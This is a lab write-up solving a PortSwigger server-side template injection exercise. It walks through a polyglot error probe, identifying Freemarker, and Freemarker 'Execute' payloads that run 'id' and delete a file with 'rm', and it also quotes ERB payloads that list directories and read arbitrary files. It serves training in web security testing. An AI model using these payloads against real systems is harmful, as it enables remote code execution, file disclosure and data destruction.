## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5c807b57-ad84-43a9-a91e-fdd8ada03b24)

## Overview :

In addition to providing the fundamentals of how to create and use templates, the documentation may also provide some sort of "Security" section. 

This can be an invaluable resource, even acting as a kind of cheat sheet for which behaviors you should look for during auditing, as well as how to exploit them. 

 For example, in ERB, the documentation reveals that you can list all directories and then read arbitrary files as follows:

 ```bash
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```
## Solution :

Login to the website using the credentials - `content-manager:C0nt3ntM4n4g3r`.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9bbe4ff7-b30b-4b0d-8d23-f97f15f9bb84)

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ea47aaa0-b79a-4350-b57d-c0dcd509b58c)

So here we have an option to edit out template. When we enter `${{<%[%'"}}%\` & save the template , it doesn't return anything which means it caused an error at the backend. This confirms the SSTI vulnerability.

### Identifying the template engine -

When we enter `${9/0}` (divide by zero expression), we get an error in the response indicating that the template engine used is **Freemarker.**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4c2cef4f-f565-4fc0-9f8f-8c4d3c5b57dc)


### Executing arbitrary code -

We can run code on Freemarker using this -

```java
${"freemarker.template.utility.Execute"?new()("id")}
```
> **Reference**
>   - https://portswigger.net/research/server-side-template-injection
>   - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker---code-execution

On previewing the template after entering the following payload gives us the **id** as **carlos**.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/87e8ce47-1682-4ffc-988a-1e7ce0f4bd33)

To delete this just replace the id command to **rm /home/carlos/morale.txt**

```java
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

And we have successfully solved the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/26bb6dc6-ed7c-43fe-9fe3-1c927ee7afe5)
